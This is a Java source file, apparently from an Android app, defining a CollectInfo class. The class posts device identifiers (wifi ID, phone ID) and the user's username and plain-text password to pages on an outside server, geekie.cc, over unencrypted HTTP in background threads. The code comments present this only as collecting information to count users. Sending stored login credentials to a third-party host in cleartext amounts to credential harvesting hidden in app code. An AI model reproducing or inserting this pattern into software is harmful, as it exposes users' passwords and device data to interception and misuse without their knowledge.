package com.gusteauscuter.youyanguan.internet.server;

import com.gusteauscuter.youyanguan.data_Class.DeviceInfo;
import com.gusteauscuter.youyanguan.data_Class.UserLoginInfo;

import org.apache.commons.httpclient.NameValuePair;

/**
 *
 */
public class CollectInfo {

    private static final String URL_POST_DEVICE_INFO="http://geekie.cc/collectInfo/device.jsp";
    private static final String URL_POST_USER_INFO="http://geekie.cc/collectInfo/user.jsp";

//    private static final String URL_POST_DEVICE_INFO="localhost:8080/collectInfo/device.jsp";
//    private static final String URL_POST_USER_INFO="localhost:8080/collectInfo/user.jsp";

    /**
     * @param deviceInfo the information collected to check the user's number
     * @// TODO: 2016/1/30 0030  just to post the device information to the URL:URL_POST_DEVICE_INFO
     */
    public static void postRequest( DeviceInfo deviceInfo){

        NameValuePair[] nameValuePairs = {
                new NameValuePair("wifiID", deviceInfo.getWifiID()),
                new NameValuePair("phoneID", deviceInfo.getPhoneID()) };

        new PostThread(URL_POST_DEVICE_INFO,nameValuePairs).start();
    }

    /**
     * @param userLoginInfo the information collected to check the user's number
     * @// TODO: 2016/1/30 0030  to post the userLoginState information to the URL:URL_POST_USER_INFO
     */
    public static void postRequest( UserLoginInfo userLoginInfo){

        NameValuePair[] nameValuePairs = {
                new NameValuePair("username", userLoginInfo.getUsername()),
                new NameValuePair("password", userLoginInfo.getPassword()),
                new NameValuePair("state", String.valueOf(userLoginInfo.IsLogined()))};

        new PostThread(URL_POST_USER_INFO,nameValuePairs).start();

    }


}
